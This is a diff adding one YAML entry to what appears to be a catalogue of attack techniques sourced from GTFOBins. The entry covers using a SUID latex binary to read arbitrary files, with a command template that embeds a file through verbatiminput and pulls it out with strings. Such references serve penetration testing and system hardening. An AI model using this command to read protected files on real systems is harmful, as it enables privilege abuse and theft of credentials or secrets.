@@ -1,0 +1,27 @@
+id: gtfobins/latex/file-read/suid
+type: binary
+platform: linux
+name: latex
+phases:
+- collection
+- privilege-escalation
+capabilities:
+- file-read
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'latex ''\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}''
+
+    strings texput.dvi'
+  comment: The read file will be part of the PDF output.
+references:
+- https://gtfobins.github.io/gtfobins/latex/
+tags:
+- linux
+- unix
+- gtfobins
